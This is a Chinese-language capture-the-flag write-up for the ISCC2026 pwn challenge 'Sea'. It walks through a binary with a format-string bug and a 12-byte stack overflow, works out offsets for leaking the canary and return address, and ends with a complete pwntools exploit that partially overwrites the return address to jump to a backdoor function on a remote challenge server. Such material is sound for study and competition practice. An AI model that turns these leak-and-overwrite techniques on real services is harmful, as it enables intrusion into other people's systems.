+++
title = "Sea"
date = "2026-05-15"
type = "post"
categories = ["ISCC2026"]
tags = ["ISCC2026"]
draft = false
+++

=========================


PWN - Sea

### 解题思路

保护全开：PIE、NX、Stack Canary、Partial RELRO。

2. 逆向分析
-----------

### 关键函数

system_reboot_comms **(0x1229)** — 后门函数：

void system_reboot_comms() {

puts("[+] Comm-Link Re-established. Entering Maintenance Shell.");

fflush(stdout);

system("cat flag.txt");

exit(0);

}

直接调用 system("cat flag.txt")，这就是目标。

process_emergency_command **(0x130d)** — 漏洞函数：

void process_emergency_command() {

char buf[112]; // rbp-0x70, 112 bytes

int attempts = 2;

puts(menu);

while (attempts &gt; 0) {

printf("[Remaining Attempts: %d] &gt; ", attempts);

int n = read(0, buf, 0x7c); // 读入 124 字节 → 溢出 12 字节！

if (n &lt;= 0) break;

printf(buf); // 格式化字符串漏洞！

fflush(stdout);

attempts--;

}

}

### 栈布局 (进入 process_emergency_command 后)

rbp+0x8: return address (→ main+0x2f)

rbp+0x0: saved rbp

rbp-0x8: stack canary

...

rbp-0x70: buf[112] ← read(0, buf, 0x7c) 可写 124 字节

rbp-0x78: menu ptr

rbp-0x80: (rsp after allocation)

3. 漏洞分析
-----------

两个漏洞同时存在：

### (a) 格式化字符串

printf(buf) 将用户输入直接作为格式化字符串处理。可以利用 %p 泄露栈数据，利用 %n 写任意地址。

### (b) 栈溢出

read(0, buf, 0x7c) 读 124 字节到 112 字节缓冲区，溢出 12 字节刚好覆盖 saved rbp 和 return address 的低 4 字节。

4. 利用思路
-----------

只有 **2 次机会** (attempts = 2)：

  ---------- ------------------------ ----------------------------------------------
  **次数**   **目的**                 **方法**
  1          泄露 canary 和返回地址   格式化字符串 %21\$p.%23\$p
  2          覆盖返回地址 → 后门      栈溢出，保留 canary，改写 ret addr 低 2 字节
  ---------- ------------------------ ----------------------------------------------

### 格式化字符串偏移计算

printf 调用时 rsp = rbp - 0x80，栈上参数从 %6\$ 开始：

%6\$ = [rsp] = [rbp-0x80]

...

%21\$ = [rsp+0x78] = [rbp-0x8] → canary

%22\$ = [rsp+0x80] = [rbp] → saved rbp

%23\$ = [rsp+0x88] = [rbp+0x8] → return address

payload1: %21\$p.%23\$p → 输出 0x&lt;canary&gt;.0x&lt;ret_addr&gt;

### 返回地址改写

原始返回地址: PIE_base + 0x13fb (main 中 call process_emergency_command 的下一条)\
目标地址: PIE_base + 0x1229 (system_reboot_comms)

两者仅低 2 字节不同（0x13fb → 0x1229），高位由 PIE base 决定且相同。

### 栈对齐修复

**关键细节**: 通过 ret 跳到 system_reboot_comms 时，栈比正常 call 少了一个 push rip，导致 8 字节未对齐。glibc 的 system() 内部使用 movaps 要求 16 字节对齐，否则 SIGSEGV。

修复：跳转到 0x122e 跳过 endbr64; push rbp，从 mov rbp, rsp 开始执行，对齐恢复正常。

### 溢出 Payload 构造

offset 0-103: 'A' * 104 (填充到 canary)

offset 104-111: p64(canary) (保留 canary)

offset 112-119: 'B' * 8 (saved rbp，无所谓)

offset 120-121: p16(target_low) (只覆写 ret addr 低 2 字节)

总长度: 122 字节

5. Exploit
----------

from pwn import *

context.binary = './sea'

context.log_level = 'info'

HOST = '39.96.193.120'

PORT = 10009

e = ELF('./sea')

MAIN_RET_OFFSET = 0x13fb

TARGET_OFFSET = 0x122e # system_reboot_comms+5，跳过 push rbp 修复栈对齐

p = remote(HOST, PORT)

p.recvuntil(b'&gt; ')

# ---- 第一次：泄露 canary 和返回地址 ----

p.sendline(b'%21\$p.%23\$p')

resp = p.recvuntil(b'&gt; ')

leak_line = resp.split(b'\\n')[0]

parts = leak_line.split(b'.')

canary = int(parts[0], 16)

ret_addr = int(parts[1], 16)

pie_base = ret_addr - MAIN_RET_OFFSET

target = pie_base + TARGET_OFFSET

log.success(f'Canary: {hex(canary)}')

log.success(f'PIE base: {hex(pie_base)}')

log.success(f'Target: {hex(target)}')

# ---- 第二次：栈溢出跳转 ----

target_low = target & 0xFFFF

payload2 = b'A' * 104 # 填充

payload2 += p64(canary) # 保留 canary

payload2 += b'B' * 8 # saved rbp

payload2 += p16(target_low) # ret addr 低 2 字节

p.send(payload2)

data = p.recvall(timeout=3)

print(data.decode(errors='replace'))
